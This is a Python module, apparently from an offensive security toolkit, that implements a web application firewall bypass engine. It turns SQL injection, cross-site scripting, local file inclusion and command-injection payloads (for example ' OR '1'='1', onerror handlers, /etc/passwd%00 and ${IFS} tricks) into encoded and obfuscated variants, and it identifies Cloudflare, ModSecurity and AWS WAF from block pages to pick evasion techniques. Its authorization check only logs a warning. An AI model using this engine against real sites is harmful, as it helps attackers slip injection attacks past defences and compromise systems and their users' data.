"""
WAF Bypass Engine

Implements techniques to bypass Web Application Firewalls:
- Payload obfuscation
- Encoding techniques
- Request fragmentation
- Header manipulation
- Behavioral evasion
"""

import base64
import binascii
import logging
import random
from typing import Dict, List, Optional
from urllib.parse import quote

from security_assistant.offensive.authorization import AuthorizationService

logger = logging.getLogger(__name__)


class WAFBypassEngine:
    """
    WAF bypass techniques engine.
    
    Args:
        auth_service: Authorization service for ToS checking
    """
    
    def __init__(self, auth_service: Optional[AuthorizationService] = None):
        self.auth_service = auth_service or AuthorizationService()
        self.encoding_techniques = [
            "url", "double_url", "hex", "base64", "unicode", "html",
            "javascript", "mixed_case", "null_bytes", "comments", "whitespace"
        ]
        
        self._technique_map = {
            "url": self._url_encode,
            "double_url": self._double_url_encode,
            "hex": self._hex_encode,
            "base64": self._base64_encode,
            "unicode": self._unicode_encode,
            "html": self._html_encode,
            "javascript": self._javascript_encode,
            "mixed_case": self._mixed_case,
            "null_bytes": self._null_bytes,
            "comments": self._add_comments,
            "whitespace": self._add_whitespace
        }
        
        # Validate configuration
        self._validate_configuration()
        
        logger.info("WAFBypassEngine initialized")
    
    def _validate_configuration(self) -> None:
        """Validate engine configuration."""
        if not self.auth_service.check_tos_accepted():
            logger.warning("ToS not accepted for WAF bypass operations")
    
    def obfuscate_payload(
        self,
        payload: str,
        technique: Optional[str] = None,
        max_techniques: int = 3
    ) -> List[str]:
        """
        Obfuscate payload using various techniques.
        
        Args:
            payload: Original payload to obfuscate
            technique: Specific technique to use (None for random)
            max_techniques: Maximum number of techniques to apply
            
        Returns:
            List of obfuscated payloads
        """
        if technique:
            return [self._apply_technique(payload, technique)]
        
        # Apply multiple techniques
        techniques = random.sample(self.encoding_techniques, min(max_techniques, len(self.encoding_techniques)))
        return [self._apply_technique(payload, tech) for tech in techniques]
    
    def _apply_technique(self, payload: str, technique: str) -> str:
        """Apply specific obfuscation technique."""
        try:
            handler = self._technique_map.get(technique)
            if handler:
                return handler(payload)
            return payload
        except Exception as e:
            logger.error("Technique %s failed: %s", technique, e)
            return payload
    
    def _url_encode(self, payload: str) -> str:
        """URL encode payload."""
        return quote(payload)
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload."""
        return quote(quote(payload))
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload."""
        return binascii.hexlify(payload.encode()).decode()
    
    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload."""
        return base64.b64encode(payload.encode()).decode()
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload."""
        return payload.encode('utf-16le').hex()
    
    def _html_encode(self, payload: str) -> str:
        """HTML encode payload."""
        html_chars = {
            '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'
        }
        return ''.join(html_chars.get(c, c) for c in payload)
    
    def _javascript_encode(self, payload: str) -> str:
        """JavaScript encode payload."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _mixed_case(self, payload: str) -> str:
        """Randomize case of payload."""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def _null_bytes(self, payload: str) -> str:
        """Add null bytes to payload."""
        return payload.replace(' ', '\x00')
    
    def _add_comments(self, payload: str) -> str:
        """Add comments to payload."""
        comments = ['/*!*/', '/*!12345*/', '/*!@#$%*/', '/*random*/']
        return random.choice(comments) + payload + random.choice(comments)
    
    def _add_whitespace(self, payload: str) -> str:
        """Add random whitespace to payload."""
        whitespace_chars = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
        return ''.join(c + random.choice(whitespace_chars) if random.random() > 0.7 else c for c in payload)
    
    def generate_bypass_payloads(
        self,
        base_payload: str,
        payload_type: str,
        max_variants: int = 10
    ) -> List[str]:
        """
        Generate multiple bypass payloads for a given vulnerability type.
        
        Args:
            base_payload: Base payload to modify
            payload_type: Type of vulnerability (sqli, xss, lfi, etc.)
            max_variants: Maximum number of variants to generate
            
        Returns:
            List of bypass payloads
        """
        variants = []
        
        # Type-specific bypasses
        if payload_type == "sqli":
            variants.extend(self._sqli_bypass(base_payload))
        elif payload_type == "xss":
            variants.extend(self._xss_bypass(base_payload))
        elif payload_type == "lfi":
            variants.extend(self._lfi_bypass(base_payload))
        elif payload_type == "rce":
            variants.extend(self._rce_bypass(base_payload))
        
        # General obfuscation
        for variant in variants[:max_variants]:
            obfuscated = self.obfuscate_payload(variant, max_techniques=2)
            variants.extend(obfuscated)
        
        return list(set(variants))[:max_variants]
    
    def _sqli_bypass(self, payload: str) -> List[str]:
        """SQL injection specific bypasses."""
        bypasses = []
        
        # Common SQLi bypass patterns
        patterns = [
            ("' OR '1'='1", "' OR '1'='1' -- "),
            ("admin'--", "admin'/*comment*/--"),
            ("UNION SELECT", "UNION/*!50000SELECT*/"),
            ("information_schema", "information_schema.tables"),
            ("1=1", "1=1/*!AND*/1=1")
        ]
        
        for pattern, replacement in patterns:
            if pattern in payload:
                bypasses.append(payload.replace(pattern, replacement))
        
        # Add common bypass techniques
        bypasses.extend([
            payload.replace(" ", "/**/"),
            payload.replace(" ", "%09"),
            payload.replace("=", "LIKE"),
            payload.replace("'", "'||'"),
            payload.replace("'", "'-- -")
        ])
        
        return bypasses
    
    def _xss_bypass(self, payload: str) -> List[str]:
        """XSS specific bypasses."""
        bypasses = []
        
        # Common XSS bypass patterns
        patterns = [
            ("<script>", "<img src=x onerror="),
            ("alert(", "prompt("),
            ("javascript:", "data:text/javascript,"),
            ("onerror=", "onload=")
        ]
        
        for pattern, replacement in patterns:
            if pattern in payload:
                bypasses.append(payload.replace(pattern, replacement))
        
        # Add common bypass techniques
        bypasses.extend([
            payload.replace("<", "&lt;"),
            payload.replace(">", "&gt;"),
            payload.replace(" ", "%09"),
            payload.replace("(", "(/*!*/)"),
            payload.replace("'", "'/*!*/'")
        ])
        
        return bypasses
    
    def _lfi_bypass(self, payload: str) -> List[str]:
        """LFI specific bypasses."""
        bypasses = []
        
        # Common LFI bypass patterns
        patterns = [
            ("/etc/passwd", "/etc/passwd%00"),
            ("../../", "....//"),
            ("./", ".%2f"),
            ("../", "..%2f")
        ]
        
        for pattern, replacement in patterns:
            if pattern in payload:
                bypasses.append(payload.replace(pattern, replacement))
        
        # Add common bypass techniques
        bypasses.extend([
            payload.replace("/", "%2f"),
            payload.replace("/", "%5c"),
            payload.replace(".", "%2e"),
            payload + "%00",
            payload + "?"
        ])
        
        return bypasses
    
    def _rce_bypass(self, payload: str) -> List[str]:
        """RCE specific bypasses."""
        bypasses = []
        
        # Common RCE bypass patterns
        patterns = [
            ("|", "||"),
            (";", "%3b"),
            ("&", "%26"),
            ("`", "%60")
        ]
        
        for pattern, replacement in patterns:
            if pattern in payload:
                bypasses.append(payload.replace(pattern, replacement))
        
        # Add common bypass techniques
        bypasses.extend([
            payload.replace(" ", "${IFS}"),
            payload.replace(" ", "$IFS$9"),
            payload.replace("|", "||"),
            payload.replace(";", ";;"),
            payload.replace("&", "&&")
        ])
        
        return bypasses
    
    def get_available_techniques(self) -> List[str]:
        """Get list of available bypass techniques."""
        return self.encoding_techniques
    
    def analyze_waf_response(
        self,
        response_text: str,
        response_headers: Dict[str, str]
    ) -> Dict[str, any]:
        """
        Analyze WAF response to determine bypass strategy.
        
        Args:
            response_text: Response body
            response_headers: Response headers
            
        Returns:
            Analysis with recommended bypass techniques
        """
        analysis = {
            "waf_type": "unknown",
            "block_reason": "unknown",
            "recommended_techniques": [],
            "confidence": "low"
        }
        
        # Check for common WAF patterns
        text_lower = response_text.lower()
        
        if "cloudflare" in text_lower:
            analysis["waf_type"] = "Cloudflare"
            analysis["recommended_techniques"] = ["url", "base64", "javascript"]
            analysis["confidence"] = "high"
        elif "mod_security" in text_lower or "modsecurity" in text_lower:
            analysis["waf_type"] = "ModSecurity"
            analysis["recommended_techniques"] = ["double_url", "unicode", "null_bytes"]
            analysis["confidence"] = "high"
        elif "aws waf" in text_lower:
            analysis["waf_type"] = "AWS WAF"
            analysis["recommended_techniques"] = ["base64", "hex", "whitespace"]
            analysis["confidence"] = "high"
        
        # Check block reason
        if "sql injection" in text_lower:
            analysis["block_reason"] = "sql_injection"
            analysis["recommended_techniques"].extend(["hex", "javascript", "comments"])
        elif "cross-site scripting" in text_lower or "xss" in text_lower:
            analysis["block_reason"] = "xss"
            analysis["recommended_techniques"].extend(["html", "unicode", "mixed_case"])
        elif "file inclusion" in text_lower or "lfi" in text_lower:
            analysis["block_reason"] = "lfi"
            analysis["recommended_techniques"].extend(["double_url", "hex", "null_bytes"])
        
        # Remove duplicates and limit to available techniques
        analysis["recommended_techniques"] = list({t for t in analysis["recommended_techniques"] if t in self.encoding_techniques})
        
        return analysis
    
    def create_bypass_strategy(
        self,
        waf_type: str,
        vulnerability_type: str
    ) -> Dict[str, any]:
        """
        Create optimal bypass strategy for given WAF and vulnerability.
        
        Args:
            waf_type: Detected WAF type
            vulnerability_type: Type of vulnerability to exploit
            
        Returns:
            Bypass strategy with techniques and examples
        """
        # Default strategy
        strategy = {
            "waf_type": waf_type,
            "vulnerability_type": vulnerability_type,
            "primary_techniques": [],
            "secondary_techniques": [],
            "examples": [],
            "success_rate": "unknown"
        }
        
        # WAF-specific strategies
        if waf_type == "Cloudflare":
            strategy["primary_techniques"] = ["url", "base64", "javascript"]
            strategy["secondary_techniques"] = ["unicode", "mixed_case"]
            strategy["success_rate"] = "medium"
        elif waf_type == "ModSecurity":
            strategy["primary_techniques"] = ["double_url", "unicode", "null_bytes"]
            strategy["secondary_techniques"] = ["comments", "whitespace"]
            strategy["success_rate"] = "high"
        elif waf_type == "AWS WAF":
            strategy["primary_techniques"] = ["base64", "hex", "whitespace"]
            strategy["secondary_techniques"] = ["javascript", "html"]
            strategy["success_rate"] = "medium"
        
        # Vulnerability-specific examples
        if vulnerability_type == "sqli":
            strategy["examples"] = [
                "' OR '1'='1' --> ' OR '1'='1' -- ",
                "UNION SELECT --> UNION/*!50000SELECT*/",
                "admin'-- --> admin'/*comment*/--"
            ]
        elif vulnerability_type == "xss":
            strategy["examples"] = [
                "<script>alert(1)</script> --> <img src=x onerror=alert(1)>",
                "alert(1) --> prompt(1)",
                "onerror= --> onload="
            ]
        elif vulnerability_type == "lfi":
            strategy["examples"] = [
                "/etc/passwd --> /etc/passwd%00",
                "../../ --> ....//",
                "/ --> %2f"
            ]
        
        return strategy
